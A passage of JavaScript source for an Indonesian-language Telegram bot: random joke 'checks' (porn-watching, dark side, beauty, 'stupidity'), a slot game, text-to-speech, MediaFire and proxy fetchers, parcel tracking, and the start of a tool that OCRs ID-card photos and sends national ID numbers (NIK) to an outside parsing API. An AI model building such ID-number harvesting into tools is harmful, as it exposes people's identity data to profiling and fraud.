bot.onText(/^\/cekmesum(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const nama = msg.from.first_name || "Kamu";

  try {
    await bot.sendMessage(
      chatId,
      generateCekMesum(nama),
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔄 Cek Lagi", callback_data: "cekmesum_lagi" }]
          ]
        },
        reply_to_message_id: msg.message_id
      }
    );
  } catch (e) {
    console.error("CEKMESUM ERROR:", e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat cek mesum.");
  }
});

// ================= HANDLE TOMBOL CEK LAGI =================
bot.on("callback_query", async (q) => {
  try {
    if (q.data !== "cekmesum_lagi") return;

    const msg = q.message;
    const nama = q.from.first_name || "Kamu";

    await bot.editMessageText(
      generateCekMesum(nama),
      {
        chat_id: msg.chat.id,
        message_id: msg.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔄 Cek Lagi", callback_data: "cekmesum_lagi" }]
          ]
        }
      }
    );

    await bot.answerCallbackQuery(q.id);
  } catch (e) {
    console.error("CEKMESUM AGAIN ERROR:", e);
  }
});
// ================= CEK SERING NONTON BOKEP =================
bot.onText(/^\/ceknontonbokep(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const hasil = [
      "⚠️ Jarang banget, mungkin 1 tahun sekali 😅",
      "😳 Sering, hampir tiap malam",
      "🤭 Pernah, tapi pura-pura lupa",
      "🚫 Tidak pernah, aku anak soleh/solehah",
      "😂 Nonton kalau lagi gabut",
      "📱 Punya koleksi sendiri di HP",
      "👀 Diam-diam nonton biar gak ketahuan",
      "🔥 Hampir tiap hari, udah kayak ritual",
      "🤐 Pernah kegep sama keluarga",
      "🙈 Sering, tapi pura-pura suci",
      "😇 Enggak pernah, beneran aman",
      "📀 Masih simpan DVD jadul",
      "💻 Streaming tiap weekend",
      "🕵️‍♂️ Suka nonton tapi pake mode penyamaran",
      "😴 Pernah ketiduran pas lagi nonton",
      "🤡 Sok-sokan bilang gak pernah",
      "💀 Udah kecanduan parah",
      "😅 Pernah tapi langsung tobat",
      "🤣 Suka share link ke temen",
      "👻 Nonton tapi takut dosa",

      // tambahan banyak 👇
      "📵 Hapus history tiap habis nonton",
      "🧹 Browser selalu mode incognito",
      "🔕 Volume kecil banget biar aman",
      "⌛ Niatnya sebentar, malah lama",
      "📲 Ada folder rahasia tapi bilang isinya tugas",
      "😬 Panik kalau ada yang pinjam HP",
      "🕶️ Aktifkan mode gelap biar makin aman",
      "🫣 Tutup layar cepat kalau ada suara langkah",
      "⏰ Nonton pas semua orang tidur",
      "📶 Boros kuota gara-gara video",
      "🔍 Lebih jago cari video daripada tugas",
      "😌 Bilang ‘terakhir’, tapi bohong",
      "🧠 Hafal judul tapi lupa niat awal",
      "🤥 Ngeles kalau ditanya riwayat pencarian",
      "🙏 Habis nonton langsung istighfar",
      "🧐 Penasaran doang… tapi keterusan",
      "🧃 Sambil ngemil biar santai",
      "🛌 Posisi strategis biar aman",
      "😆 Ketawa sendiri pas adegan absurd",
      "📉 Produktivitas menurun drastis",
      "🚪 Kunci pintu walau sendirian",
      "🤯 Niat tidur malah overthinking",
      "🫠 Tau salah tapi diulang lagi",
      "🎭 Di luar alim, di dalam browser liar",
      "🧍‍♂️ Cuma nonton, gak ngapa-ngapain… katanya",
      "📛 History bersih tapi cache penuh",
      "💡 Tiba-tiba khatam shortcut keyboard",
      "😵 Buka satu video, lanjut sepuluh",
      "🛐 Janji terakhir ke diri sendiri (lagi)",
      "📱 HP panas tapi hati berdebar",
    ];

    const random = hasil[Math.floor(Math.random() * hasil.length)];
    const nama = msg.from.username
      ? `@${msg.from.username}`
      : msg.from.first_name || "Kamu";

    await bot.sendMessage(
      chatId,
      `🔞 *Cek sering nonton bokep*\n\nUntuk: ${nama}\n\nHasil: ${random}`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id
      }
    );

  } catch (e) {
    console.error("CEKNONTONBOKEP ERROR:", e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengecek.");
  }
});
// ================= CEK SISI BAIK =================
bot.onText(/^\/ceksisibaik(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const nama =
      msg.from.first_name ||
      msg.from.username ||
      "Kamu";

    const sisiBaik = [
      "Penyayang banget ❤️",
      "Suka membantu orang 🤝",
      "Selalu sabar meski disakitin 😇",
      "Murah senyum 😊",
      "Pemaaf walau pernah disakiti 💖",
      "Rajin ibadah ⛪🕌",
      "Bisa bikin orang lain nyaman 😍",
      "Punya hati emas ✨",
      "Selalu support teman 🤗",
      "Nggak pernah lupa berterima kasih 🙏",
      "Rendah hati meski hebat 🌸",
      "Suka menolong tanpa pamrih 💫",
      "Bijaksana dalam mengambil keputusan 📖",
      "Pandai menghibur orang lain 😁",
      "Setia sama janji 🤞",
      "Tidak mudah iri sama orang lain 🌿",
      "Punya jiwa kepemimpinan 🔥",
      "Suka berbagi rejeki 💵",
      "Berpikiran positif ✨",
      "Selalu berusaha membuat bangga orang tua 💕",
      "Pandai menjaga rahasia 🔒",
      "Disukai banyak orang karena rendah hati 🤲",
      "Tidak suka menghakimi orang lain ⚖️",
      "Selalu menghormati orang tua 👪",
      "Tulus dalam berteman 🌺",
      "Suka memotivasi orang lain 🌟",
      "Cerdas sekaligus baik hati 🧠❤️",
      "Ramah sama siapa aja 🙌",
      "Nggak gampang marah 😌",
      "Penyemangat orang sekitar 🔥",
      "Hati penuh kasih sayang 🌹",
      "Nggak pernah tega melihat orang susah 😢",
      "Pandai menenangkan orang lain 🌈",
      "Suka tersenyum walau sedang sedih 💕",
      "Menjadi pendengar yang baik 👂",
      "Penyabar luar biasa 🕊️",
      "Suka memberi tanpa berharap balasan 🎁",
      "Penuh kasih dan perhatian 🫂",
      "Sosok inspiratif buat banyak orang 🌟",
      "Rendah hati walau punya segalanya 💎",
      "Suka membantu tanpa diminta 🤝",
      "Bersyukur atas hal kecil 🌿",
      "Selalu berdoa untuk kebaikan 🌙",
      "Menghargai waktu orang lain ⏳",
      "Berhati lembut 🪶",
      "Selalu mengutamakan kebahagiaan orang lain 💞",
      "Mudah mengikhlaskan 🌌",
      "Selalu optimis ☀️",
      "Sosok pekerja keras 💪",
      "Punya jiwa sosial tinggi 🌍",
      "Bisa dipercaya 100% 🔑",
      "Suka menyemangati orang yang jatuh 💐",
      "Sabar menghadapi masalah 🌊",
      "Nggak suka membicarakan keburukan orang 🚫",
      "Punya aura positif ✨",
      "Pandai menjaga persahabatan 🤝",
      "Mengutamakan keluarga 💒",
      "Selalu mengucap syukur 🙏",
      "Sosok yang bikin nyaman 🏡",
      "Menghargai setiap perbedaan 🌏",
      "Bisa diandalkan dalam situasi sulit 🛡️",
      "Berani jujur meski pahit 🍃"
    ];

    const hasil = sisiBaik[Math.floor(Math.random() * sisiBaik.length)];

    await bot.sendMessage(
      chatId,
      `👼 *Cek Sisi Baik*\n\nHai *${nama}* ✨\n\nSisi baik kamu adalah:\n👉 ${hasil}`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id
      }
    );

  } catch (e) {
    console.error("CEKSISIBAIK ERROR:", e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat cek sisi baik.");
  }
});
// ================= FUNCTION GAME CEK SISI GELAP =================
function gameCekSisiGelap(username) {
  const hasil = [
    "⚫ Kamu punya sifat manipulatif tanpa sadar",
    "⚫ Kamu suka menyimpan dendam lama",
    "⚫ Kadang kamu menikmatinya saat orang lain gagal",
    "⚫ Kamu punya sisi dingin yang jarang orang tahu",
    "⚫ Kamu mudah iri dengan pencapaian orang lain",
    "⚫ Kamu bisa tega jika merasa disakiti duluan",
    "⚫ Kamu sering mengabaikan perasaan orang lain",
    "⚫ Kamu punya sifat egois yang cukup kuat",
    "⚫ Kamu suka menyalahkan orang lain diam-diam",
    "⚫ Kamu gampang kehilangan kendali saat marah",
    "⚫ Kamu bisa berpura-pura baik di depan orang",
    "⚫ Kamu sering menutup diri dari semua orang",
    "⚫ Kamu tega meninggalkan orang yang peduli padamu",
    "⚫ Kamu punya sisi ambisius yang bisa merugikan orang lain",
    "⚫ Kamu bisa jadi dingin seperti es saat sakit hati",
    "⚫ Kamu sering menyembunyikan rahasia besar",
    "⚫ Kamu punya sisi yang suka menguji orang lain",
    "⚫ Kamu bisa tega memanfaatkan kelemahan orang",
    "⚫ Kamu lebih mementingkan dirimu sendiri",
    "⚫ Kadang kamu menikmati drama dalam hidup orang lain",
    "⚫ Kamu punya sisi gelap yang membuatmu sulit percaya orang lain",
    "⚫ Kamu sering pura-pura kuat padahal hatimu rapuh",
    "⚫ Kamu bisa bersikap manipulatif saat terdesak",
    "⚫ Kamu suka melihat orang lain kesulitan diam-diam",
    "⚫ Kamu tega membiarkan orang lain tersakiti",
    "⚫ Kamu mudah cemburu tanpa alasan jelas",
    "⚫ Kamu suka menyimpan rahasia berbahaya",
    "⚫ Kamu bisa tiba-tiba menghilang dari orang terdekat",
    "⚫ Kamu tega bersikap dingin meski tahu orang butuh bantuan",
    "⚫ Kamu bisa tega berkhianat jika itu menguntungkanmu",
    "⚫ Kamu punya sifat licik yang jarang terlihat",
    "⚫ Kamu suka membicarakan orang lain di belakang",
    "⚫ Kamu tega memanfaatkan kebaikan orang lain",
    "⚫ Kamu sering membuat orang lain merasa bersalah padahal bukan salah mereka",
    "⚫ Kamu punya sisi pendendam yang dalam",
    "⚫ Kamu kadang sengaja membuat orang lain cemburu",
    "⚫ Kamu suka menguji kesetiaan orang lain dengan cara kejam",
    "⚫ Kamu bisa tega meninggalkan orang tanpa alasan jelas",
    "⚫ Kamu sering mengabaikan perasaanmu sendiri sampai hancur",
    "⚫ Kamu bisa pura-pura peduli padahal tidak",
    "⚫ Kamu tega membiarkan orang lain salah paham tentangmu",
    "⚫ Kamu sering membuat keputusan dingin tanpa memikirkan akibat",
    "⚫ Kamu punya sisi gelap yang hanya muncul saat sendirian",
    "⚫ Kamu suka membiarkan orang lain jatuh untuk melihat siapa yang bangkit",
    "⚫ Kamu bisa menjadi sangat posesif",
    "⚫ Kamu tega menyakiti hati orang yang benar-benar sayang padamu",
    "⚫ Kamu punya kebiasaan menyembunyikan sisi burukmu rapat-rapat",
    "⚫ Kamu sering mengabaikan kesalahanmu sendiri"
  ];

  const randomHasil = hasil[Math.floor(Math.random() * hasil.length)];
  return `🕳️ Hasil cek sisi gelap untuk *${username}*:\n\n${randomHasil}`;
}
// ================= COMMAND /CEKSISIGELAP =================
bot.onText(/^\/ceksisigelap(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const username = msg.from.first_name || "Kamu";

    await bot.sendMessage(
      chatId,
      gameCekSisiGelap(username),
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id
      }
    );

  } catch (e) {
    console.error("Error di ceksisigelap:", e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat cek sisi gelap.");
  }
});
// ==== GAME SLOT TELEGRAM ====
bot.onText(/^\/slot(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const slotItems = ["🍒", "🍋", "🍇", "🍉", "⭐", "7️⃣"];

    const r1 = slotItems[Math.floor(Math.random() * slotItems.length)];
    const r2 = slotItems[Math.floor(Math.random() * slotItems.length)];
    const r3 = slotItems[Math.floor(Math.random() * slotItems.length)];

    let hasil = `🎰 *SLOT GAME* 🎰\n\n[ ${r1} | ${r2} | ${r3} ]\n\n`;

    const username = msg.from.first_name || "Kamu";

    if (r1 === r2 && r2 === r3) {
      hasil += `🎉 Selamat ${username}! Jackpot 3 sama! 🎉`;
    } else if (r1 === r2 || r2 === r3 || r1 === r3) {
      hasil += `😎 Mantap ${username}, dapat 2 sama!`;
    } else {
      hasil += `😢 Yahh ${username}, coba lagi ya...`;
    }

    await bot.sendMessage(
      chatId,
      hasil,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id
      }
    );

  } catch (e) {
    console.error("SLOT GAME ERROR:", e);
    bot.sendMessage(chatId, "❌ Terjadi error saat main slot.");
  }
});
// ================= CEK CANTIK (DATA) =================
const hasilCekCantik = [
  "100% Cantik natural 🌸",
  "98% Cantik mempesona ✨",
  "95% Cantik luar dalam 💎",
  "90% Cantik bikin klepek-klepek 💖",
  "85% Cantik tapi agak jutek 😏",
  "80% Cantik bikin iri tetangga 😍",
  "75% Cantik manis kayak gula 🍬",
  "70% Cantik tapi kadang ngeselin 🙈",
  "65% Cantik sederhana 🌼",
  "60% Cantik tapi low profile 🤍",
  "55% Cantik manis alami 🌹",
  "50% Cantik standar aja 😅",
  "45% Cantik dengan gaya unik 🦋",
  "40% Cantik beda dari yang lain 🌈",
  "35% Cantik kalau lagi dandan 💄",
  "30% Cantik kalau lagi senyum 😊",
  "25% Cantik karena inner beauty 🌟",
  "20% Cantik ala kadarnya 😆",
  "15% Cantik karena sikapnya 🤗",
  "10% Cantik karena filter kamera 📸",
  "5% Cantik seadanya 🤭",
  "0% Cantik, tapi hatinya baik 💕"
];

function getRandomCekCantik() {
  return hasilCekCantik[Math.floor(Math.random() * hasilCekCantik.length)];
}

// ================= COMMAND /cekcantik =================
bot.onText(/^\/cekcantik(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const randomHasil = getRandomCekCantik();

    await bot.sendMessage(
      chatId,
      `📊 Hasil Cek Cantik Kamu:\n\n${randomHasil}`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔮 Cek Lagi", callback_data: "cekcantik_again" }]
          ]
        }
      }
    );
  } catch (e) {
    console.error("CEKCANTIK ERROR:", e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat cek cantik.");
  }
});

// ================= HANDLE TOMBOL INLINE =================
bot.on('callback_query', async (query) => {
  try {
    const data = query.data;
    const message = query.message;

    if (data === "cekcantik_again" && message) {
      const chatId = message.chat.id;
      const messageId = message.message_id;
      const randomHasil = getRandomCekCantik();

      await bot.editMessageText(
        `📊 Hasil Cek Cantik Kamu:\n\n${randomHasil}`,
        {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔮 Cek Lagi", callback_data: "cekcantik_again" }]
            ]
          }
        }
      );

      // Biar loading tombol hilang
      await bot.answerCallbackQuery(query.id);
    }
  } catch (e) {
    console.error("CEKCANTIK AGAIN ERROR:", e);
    if (query.message) {
      bot.sendMessage(query.message.chat.id, "❌ Gagal mengambil hasil cek cantik.");
    }
  }
});
// ================= GAME CEK GANTENG =================
bot.onText(/^\/cekganteng(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const persentase = Math.floor(Math.random() * 101); // 0-100
    const gantengLevel = [
      "🪞 Wajahmu bikin kaca minder",
      "😎 Kamu 100% Ganteng Paripurna",
      "🔥 Gantengmu bisa bakar hati mantan",
      "🥶 Ganteng tapi dingin kayak es batu",
      "🐸 Mirip katak, tapi tetep unik",
      "😂 Ganteng tapi receh banget",
      "👑 Raja Ganteng sejagad raya",
      "🦸‍♂️ Ganteng superhero KW",
      "🙈 Gantengnya ketutupan sifat jelek",
      "🤡 Ganteng bohongan (editan kamera)",
      "🧛‍♂️ Ganteng tapi mirip vampir",
      "🐒 Mirip monyet tapi ada pesonanya",
      "🫣 Gantengnya kebanyakan filter kamera",
      "👽 Ganteng alien luar angkasa",
      "🕶️ Ganteng misterius, bikin penasaran",
      "🎭 Ganteng kalau pake topeng aja",
      "🦁 Ganteng garang kayak singa",
      "🐼 Ganteng imut kayak panda",
      "💀 Gantengnya bikin orang takut",
      "✨ Ganteng limited edition, cuma kamu yang punya"
    ];

    const random = gantengLevel[Math.floor(Math.random() * gantengLevel.length)];

    await bot.sendMessage(
      chatId,
      `✨ *Cek Ganteng* ✨\n\nPersentase gantengmu: *${persentase}%*\n${random}`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id
      }
    );

  } catch (err) {
    console.error("CEKGANTENG ERROR:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat cek ganteng.");
  }
});
// ================= FUNCTION GAME CEK TOLOL =================
function gameCekTolol(username) {
  const hasil = [
    "Kamu 0% tolol ✅",
    "Kamu 10% tolol 🤔",
    "Kamu 25% tolol 😅",
    "Kamu 40% tolol 🤣",
    "Kamu 55% tolol 🙃",
    "Kamu 70% tolol 😂",
    "Kamu 85% tolol 🫠",
    "Kamu 100% tolol 💀",
    "Kamu bukan tolol, kamu jenius 🧠✨",
    "Tololmu Unlimited ♾️🤡"
  ];

  const randomHasil = hasil[Math.floor(Math.random() * hasil.length)];
  return `🔍 Hasil cek tolol untuk *${username}*:\n\n${randomHasil}`;
}
// ================= COMMAND /CEKTOLOL =================
bot.onText(/^\/cektolol(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const username = msg.from.first_name || "Kamu";

    await bot.sendMessage(
      chatId,
      gameCekTolol(username),
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id
      }
    );

  } catch (e) {
    console.error("CEKTOLOL ERROR:", e);
    bot.sendMessage(chatId, "❌ Terjadi error saat cek tolol.");
  }
});
// ================= GAME TEBAK MASA DEPAN =================
bot.onText(/^\/tebakmasadepan(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const ramalan = [
      // Cinta 💘
      "Kamu akan segera ketemu jodohmu 💘",
      "Ada seseorang diam-diam suka sama kamu 😳",
      "Hubunganmu akan semakin harmonis 💞",
      "Kamu akan ketemu mantan secara tak terduga 😅",
      "Ada yang akan ngajak kamu jalan minggu ini 🚶‍♂️🚶‍♀️",
      "Kamu akan dapat surat cinta virtual 💌",
      "Seseorang sedang merindukanmu 💭",

      // Rezeki 💰
      "Masa depanmu penuh dengan kekayaan 💰",
      "Kamu akan dapat rezeki tak terduga 🎁",
      "Dompetmu akan segera terisi tebal 💵",
      "Kamu akan dapat traktiran gratis 🍲",
      "Rezeki dari arah yang tidak disangka-sangka 💎",
      "Proyek besar akan segera datang 💼",

      // Karier 🚀
      "Kamu akan sukses di kariermu 🚀",
      "Kamu akan jadi panutan banyak orang 👑",
      "Usahamu akan berkembang pesat 📈",
      "Akan ada peluang besar dalam pekerjaanmu ✨",
      "Mimpi-mimpimu soal karier akan terwujud 🌟",
      "Kamu akan mendapatkan penghargaan 🏆",

      // Kesehatan 💊
      "Tubuhmu akan semakin sehat 💪",
      "Kamu akan menemukan semangat baru 🌄",
      "Tidurmu akan lebih nyenyak malam ini 😴",
      "Energi positif akan mengalir dalam dirimu 🔥",
      "Kamu akan terhindar dari penyakit 🙏",

      // Keberuntungan 🍀
      "Kamu akan menemukan uang di jalan 💵🍀",
      "Keberuntungan sedang menghampirimu ✨",
      "Angka keberuntunganmu adalah 7️⃣",
      "Kamu akan memenangkan sesuatu 🎲",
      "Hari ini adalah hari hoki kamu 🍀",
      "Apa yang kamu harapkan akan terwujud 🌠",

      // Kehidupan 🌟
      "Masa depanmu penuh dengan kebahagiaan 😊",
      "Kamu akan melakukan perjalanan jauh ✈️",
      "Kamu akan ketemu teman baru yang baik 🤝",
      "Kamu akan menemukan hobi baru 🎨",
      "Kamu akan jadi lebih dewasa secara emosi 🧘",
      "Ada kabar baik yang akan membuatmu tersenyum 📩",
      "Kamu akan menjadi orang yang lebih bijak 📚"
    ];

    // pilih random
    const hasil = ramalan[Math.floor(Math.random() * ramalan.length)];

    // kirim hasil
    await bot.sendMessage(chatId, `🔮 Masa depan kamu: ${hasil}`, {
      reply_to_message_id: msg.message_id
    });

  } catch (e) {
    console.error("Error di tebakmasadepan:", e);
    await bot.sendMessage(chatId, "❌ Terjadi kesalahan, coba lagi nanti.");
  }
});
// Command /s → reply foto jadi stiker
const gTTS = require("google-tts-api");
bot.onText(/^\/vn(?:\s+([\s\S]+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const text = match[1];
    if (!text) {
      return bot.sendMessage(chatId, "❌ Contoh: /vn text luu");
    }

    // Generate link audio bahasa Indonesia
    const url = gTTS.getAudioUrl(text, {
      lang: "id",
      slow: false,
      host: "https://translate.google.com",
    });

    // Kirim sebagai VOICE (pesan suara)
    await bot.sendVoice(chatId, url, {
      reply_to_message_id: msg.message_id,
    });

  } catch (err) {
    console.error("VN ERROR:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat membuat audio");
  }
});
// /mediafire https://www.mediafire.com/file/xxxx
bot.onText(/\/mediafire (.+)/, async (msg, match) => {
  const chatId = msg.chat.id
  const mediafireUrl = match[1].trim()

  if (!mediafireUrl) {
    return bot.sendMessage(chatId, '❌ Kirim dengan format:\n/mediafire <url-mediafire>')
  }

  try {
    // 1. Ambil info file dari API FAA
    const apiUrl = `https://api-faa.my.id/faa/mediafire?url=${encodeURIComponent(mediafireUrl)}`
    const { data } = await axios.get(apiUrl)

    if (!data.status || !data.result) {
      return bot.sendMessage(
        chatId,
        `⚠️ Gagal mengambil data MediaFire.\nDetail: ${data.message || 'Tidak diketahui'}`
      )
    }

    const result = data.result
    const filename = result.filename || 'mediafire_file'
    const size = result.size || '-'
    const mime = result.mime || 'application/octet-stream'
    const downloadUrl = result.download_url || result.download

    if (!downloadUrl) {
      return bot.sendMessage(chatId, '❌ Download URL tidak ditemukan di respon API.')
    }

    // 2. Info ke user kalau bot sedang download
    await bot.sendMessage(
      chatId,
      `⏳ Sedang mengunduh file dari MediaFire...\n\nNama: ${filename}\nUkuran: ${size}`
    )

    // 3. Download file dari MediaFire (stream)
    const fileResponse = await axios({
      url: downloadUrl,
      method: 'GET',
      responseType: 'stream',
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
    })

    // 4. Kirim sebagai dokumen ke user
    await bot.sendDocument(
      chatId,
      fileResponse.data,                              // stream
      {
        caption: `✅ Berhasil diunduh dari MediaFire\n\nNama: ${filename}\nUkuran: ${size}`,
      },
      {
        filename: filename,                           // nama file yang tampil di Telegram
        contentType: mime,
      }
    )
  } catch (err) {
    console.error('Mediafire error:', err.response?.data || err.message)
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengunduh atau mengirim file dari MediaFire.')
  }
})
bot.onText(/\/cekresi(?:\s+([^\s]+)(?:\s+([^\s]+))?)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const resi = match && match[1] ? match[1].trim() : null;
  const expedition = match && match[2] ? match[2].trim() : ''; // kosong jika tidak diberikan

  try {
    if (!resi) {
      return bot.sendMessage(chatId, '❗ Gunakan: /cekresi <nomor_resi> <expedition>\nContoh: /cekresi 250918S2H0T6XV shopee-express\nKetik tanpa expedition untuk mencoba default.');
    }

    await bot.sendChatAction(chatId, 'typing');

    // build endpoint sesuai dokumentasi
    const endpoint = `https://api.nekolabs.web.id/tools/cekresi?receipt_num=${encodeURIComponent(resi)}${expedition ? '&expedition='+encodeURIComponent(expedition) : ''}`;

    // panggil API
    let apiRes;
    try {
      apiRes = await axios.get(endpoint, { timeout: 30000 });
    } catch (err) {
      console.error('cekresi axios error:', err?.response?.status, err?.response?.data || err.message);
      if (err.response && err.response.data) {
        return bot.sendMessage(chatId, `❌ API returned ${err.response.status}: ${JSON.stringify(err.response.data)}`);
      }
      return bot.sendMessage(chatId, `❌ Gagal menghubungi API: ${err.message}`);
    }

    // validasi response
    if (!apiRes.data) {
      console.error('cekresi empty response:', apiRes);
      return bot.sendMessage(chatId, '❌ Response API kosong. Coba lagi nanti.');
    }

    // jika API sukses (wrapper) — hasil berada di apiRes.data.result
    const wrapperSuccess = apiRes.data.success;
    const result = apiRes.data.result;

    if (!wrapperSuccess || !result) {
      // fallback: tampilkan keseluruhan payload
      return bot.sendMessage(chatId, `❌ Response tidak valid: ${JSON.stringify(apiRes.data)}`);
    }

    // Jika service mengembalikan success:false di dalam result (contoh pesan dari docs)
    if (result.success === false) {
      const msgApi = result.message || 'Tidak ditemukan / belum dapat dilacak.';
      // tampilkan pesan API (contoh: "Maaf, nomor resi ... belum dapat kami lacak")
      const short = [
        '📦 *Cek Resi*',
        `• Resi: \`${result.data?.resi || resi}\``,
        `• Ekspedisi: ${result.data?.ekspedisi || result.data?.ekspedisiCode || (expedition || '-')}`,
        ` `,
        `⚠️ ${msgApi}`
      ].join('\n');
      return bot.sendMessage(chatId, short, { parse_mode: 'Markdown' });
    }

    // Jika result.success true -> ada data tracking: result.data
    const d = result.data || {};
    const lines = [];
    lines.push('📦 *Hasil Cek Resi*');
    lines.push(`• Resi       : \`${d.resi || resi}\``);
    lines.push(`• Ekspedisi  : ${d.ekspedisi || d.ekspedisiCode || (expedition || '-')}`);
    if (d.status) lines.push(`• Status     : ${d.status}`);
    if (d.tanggalKirim) lines.push(`• Tanggal Kirim: ${d.tanggalKirim}`);
    if (d.lastPosition) lines.push(`• Posisi Terakhir: ${d.lastPosition}`);
    if (d.customerService) lines.push(`• Customer Service: ${d.customerService}`);
    if (d.shareLink) lines.push(`• Share Link : ${d.shareLink}`);
    // jika history array ada, tampilkan ringkasan (mis: jumlah event)
    if (Array.isArray(d.history) && d.history.length) {
      lines.push(`\n🕒 Riwayat (${d.history.length}):`);
      // tampilkan maksimal 5 event terbaru (jika banyak)
      const events = d.history.slice(0, 5);
      for (const ev of events) {
        // struktur event bisa berbeda; safe-read
        const when = ev.date || ev.tanggal || ev.time || ev.datetime || ev.created_at || '';
        const desc = ev.desc || ev.description || ev.status || JSON.stringify(ev);
        lines.push(`• ${when ? when + ' — ' : ''}${desc}`);
      }
      if (d.history.length > 5) lines.push(`_...dan ${d.history.length-5} event lagi_`);
    } else {
      lines.push('\nℹ️ Riwayat: Tidak ada atau belum tersedia.');
    }

    await bot.sendMessage(chatId, lines.join('\n'), { parse_mode: 'Markdown' });

    // optional: kirim raw JSON untuk debugging (hapus kalau tidak perlu)
    // await bot.sendMessage(chatId, '```json\n' + JSON.stringify(apiRes.data, null, 2) + '\n```', { parse_mode: 'Markdown' });

  } catch (err) {
    console.error('unexpected /cekresi error:', err?.response?.data || err?.message || err);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat memproses. Cek log server.');
  }
});
bot.onText(/\/getproxy(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const arg = match && match[1] ? match[1].trim().toLowerCase() : '';

  try {
    await bot.sendChatAction(chatId, 'typing');

    // Panggil endpoint free-proxy
    const endpoint = 'https://api.nekolabs.web.id/tools/free-proxy';
    const res = await axios.get(endpoint, { timeout: 20000 });

    if (!res.data || res.data.success !== true || !Array.isArray(res.data.result)) {
      console.error('free-proxy bad response:', res.data);
      return bot.sendMessage(chatId, '❌ Gagal mengambil proxy dari API (response tidak valid).');
    }

    const proxies = res.data.result;
    if (proxies.length === 0) {
      return bot.sendMessage(chatId, '⚠️ Tidak ada proxy tersedia saat ini. Coba lagi beberapa saat.');
    }

    // Pilih 1 proxy — default random. Jika mau deterministik, bisa pakai proxies[0]
    const pickRandom = () => proxies[Math.floor(Math.random() * proxies.length)];
    const chosen = pickRandom();

    // Format output rapi
    const lines = [];
    lines.push('🔎 *Proxy (1 hasil)*');
    lines.push(`• IP       : \`${chosen.ip}:${chosen.port}\``);
    lines.push(`• Country  : ${chosen.country || chosen.code || '-'}`);
    lines.push(`• Anonymity: ${chosen.anonymity || '-'}`);
    lines.push(`• HTTPS    : ${chosen.https || '-'}`);
    lines.push(`• Google   : ${chosen.google || '-'}`);
    lines.push(`• Last seen: ${chosen.last || '-'}`);
    lines.push('');
    lines.push('_Gunakan dengan bijak. Proxies bersifat volatile (cepat kadaluarsa)._');

    await bot.sendMessage(chatId, lines.join('\n'), { parse_mode: 'Markdown' });

    // (opsional) kirim juga satu-line connection string agar mudah dicopy
    await bot.sendMessage(chatId, `\`${chosen.ip}:${chosen.port}\``, { parse_mode: 'Markdown' });

  } catch (err) {
    console.error('error /proxy:', err?.response?.data || err?.message || err);
    if (err.response && err.response.status) {
      return bot.sendMessage(chatId, `❌ API error: ${err.response.status}`);
    }
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil proxy. Coba lagi nanti.');
  }
});
const FormData = require('form-data');
const OCR_KEY = process.env.OCR_SPACE_API_KEY || null; // optional
// helper: call nikparser
async function callNikParser(nik) {
  const endpoint = `https://api.nekolabs.web.id/tools/nikparser?nik=${encodeURIComponent(nik)}`;
  const res = await axios.get(endpoint, { timeout: 20000 });
  return res.data; // { success: true, result: {...} }
}

// helper: call OCR.space (requires API key). return text or null
async function ocrSpaceImageBuffer(buffer) {
  if (!OCR_KEY) return null;
  try {
    const form = new FormData();
    form.append('apikey', OCR_KEY);
    form.append('language', 'ind'); // set to Indonesian
    form.append('isOverlayRequired', 'false');
    form.append('file', buffer, { filename: 'ktp.jpg' });

    const res = await axios.post('https://api.ocr.space/parse/image', form, {
      headers: form.getHeaders(),
      timeout: 45000
    });

    if (res.data && res.data.IsErroredOnProcessing) {
      console.log('OCR.space error:', res.data);
      return null;
    }
    // combine parsed text
    const parsed = res.data.ParsedResults && res.data.ParsedResults[0] && res.data.ParsedResults[0].ParsedText;
    return parsed || null;
  } catch (e) {
    console.error('ocrSpaceImageBuffer error:', e?.response?.data || e.message || e);
    return null;
  }
}

// helper: download file from Telegram file path
async function downloadTelegramFileBuffer(filePath) {
  const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
  const r = await axios.get(url, { responseType: 'arraybuffer', timeout: 30000 });
  return Buffer.from(r.data, 'binary');
}

// helper: extract 16-digit NIK from text
function extractNik(text) {
  if (!text) return null;
  // remove non digits except spaces, then find 16-digit group
  const cleaned = text.replace(/\D+/g, ''); // keep only digits
